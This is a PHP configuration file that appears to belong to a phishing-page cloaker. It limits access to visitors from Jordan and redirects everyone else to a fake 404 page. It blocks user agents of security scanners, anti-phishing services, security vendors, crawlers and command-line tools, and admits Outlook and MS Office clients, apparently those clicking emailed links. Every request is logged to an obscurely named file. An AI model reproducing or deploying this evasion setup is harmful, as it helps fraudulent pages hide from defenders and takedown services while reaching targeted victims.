<?php

# Allow requests only from these countries
$allowed_countries = ['JO'];

# Where to redirect if the request failed to pass our filters. Can be a local path.
$redirect_url = "/404.html";


# Blacklisted useragents. Useragents that contains any of these words will not be allowed 
$ua_blacklist = '/zgrab\/0|libwww-perl|NetcraftSurveyAgent|facebookexternalhit|facebook|Scripting|nmap\.org|Researchscan|HttpClient|http-client|project_patchwatch|skype-url-preview|Go-http|Java\/|\/aka\.ms|CensysInspect|censys\.io|InternetMeasurement|paloaltonetworks|powershell|LinkedInBot|PageRenderer|MicrosoftPreview|SkypeUriPreview|skype-url|netcraft|phishtank|wget|gobuster|curl\/|python-requests|symantec|crowdstrike|falcon|fireeye|forcepoint|a6-indexer|adsbot-google|ahrefsbot|aolbuild|apis-google|baidu|bingbot|bingpreview|butterfly|cloudflare|duckduckgo|embedly|googlebot|ia_archiver|linkedinbot|mediapartners-google|msnbot|netcraftsurvey|outbrain|pinterest|quora|rogerbot|showyoubot|slackbot|slurp|sogou|teoma|tweetmemebot|twitterbot|urlresolver|vkshare|w3c_validator|wordpress|wprocketbot|yandex|W3C_I18n|www\.google\.com/i';


# Mozilla/4.0 (compatible; ms-office; MSOffice 16)
# Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0 OneOutlook
$ua_whitelist = '/ms-office|MSOffice 16|OneOutlook/i';




$hostname_blacklist = '/google\.com|googleusercontent|amazon/i';

$hostname_whitelist = "/\.example\.com|\.example\.org/i";


$browser_blacklist = ['Avant Browser','Arora', 'Flock', 'Konqueror','OmniWeb','Phoenix','Firebird','Mobile Explorer', 'Opera Mini','Netscape',
            'Iceweasel','KMLite', 'Midori', 'SeaMonkey', 'Lynx', 'Fluid', 'chimera', 'NokiaBrowser',
            'MSIE'];



# $os_blacklist = ['iPad', 'iPhone', 'iPod','iOS', 'macOS','tvOS', 'Mac OS X', 'Macintosh', 'Power PC Mac',  'Symbian', 'SymbianOS', 'Symbian S60', 'Ubuntu', 'Debian', 'NetBSD', 'GNU/Linux', 'OpenBSD', 'Android', 'Linux',  'Mobile','Tablet'];


$os_blacklist = [];




############ Others ############
// All requests will be logged, whether passed the filters or not.
$log_file_path = realpath(dirname(__FILE__)) . DIRECTORY_SEPARATOR . 'd80e86ceec2ee722acfc52a1e2682118.dat';

define('IPINFO_API_KEY', 'API_KEY');
define('IPINFO_API_URL', 'https://ipinfo.io/');


?>